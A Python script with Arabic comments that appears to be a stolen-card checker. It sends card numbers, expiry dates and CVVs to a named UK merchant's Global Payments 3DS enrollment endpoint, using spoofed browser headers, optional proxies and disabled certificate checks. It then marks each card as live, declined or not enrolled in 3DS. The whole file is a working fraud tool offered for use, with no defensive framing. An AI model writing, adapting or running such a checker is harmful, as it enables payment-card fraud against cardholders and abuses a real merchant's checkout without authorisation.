"""
بوابة الدفع: Global 3DS LookUp Single
الموقع: mx5oc.co.uk
نوع البوابة: Global 3DS LookUp Single
تدفق الطلبات:
1. POST /wc-api/globalpayments_threedsecure_checkenrollment/ -> التحقق من تسجيل 3DS وتصنيف النتيجة
"""
import aiohttp
import asyncio
import ssl


async def req1_check_enrollment(
    session: aiohttp.ClientSession,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 1: التحقق من تسجيل البطاقة في 3DS."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://mx5oc.co.uk",
        "Referer": "https://mx5oc.co.uk/checkout/",
    }
    payload = {
        "payment_method": "globalpayments_gpapi",
        "card_number": cc,
        "card_expiry_month": mes,
        "card_expiry_year": ano,
        "card_cvc": cvv,
        "order_id": "0",
        "wc-ajax": "checkout",
    }
    try:
        async with session.post(
            "https://mx5oc.co.uk/wc-api/globalpayments_threedsecure_checkenrollment/",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            try:
                return await r.json(content_type=None)
            except Exception:
                text = await r.text()
                return {"_raw_text": text}
    except Exception as e:
        raise RuntimeError(f"req1_check_enrollment failed: {e}") from e


async def process_GP_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global 3DS LookUp Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            res = await req1_check_enrollment(session, cc, mes, ano, cvv, proxy_url)

    except asyncio.TimeoutError:
        return f"⌛ | {cc}|{mes}|{ano}|{cvv}", "Request Timeout (20s)"
    except Exception as e:
        return f"🚨 | {cc}|{mes}|{ano}|{cvv}", f"Connection Error: {e}"

    raw_text = res.get("_raw_text", "")
    if raw_text:
        if "success" in raw_text.lower():
            return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Success (Text Response)"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Invalid Response Format"

    result = res.get("result", "")
    if result == "success" or "enrolled" in str(res).lower():
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Enrolled / Authenticated"
    elif "error" in res or result == "failure":
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", res.get("message", "Declined / Error")
    else:
        return f"🟡 | {cc}|{mes}|{ano}|{cvv}", "No 3DS / Frictionless"
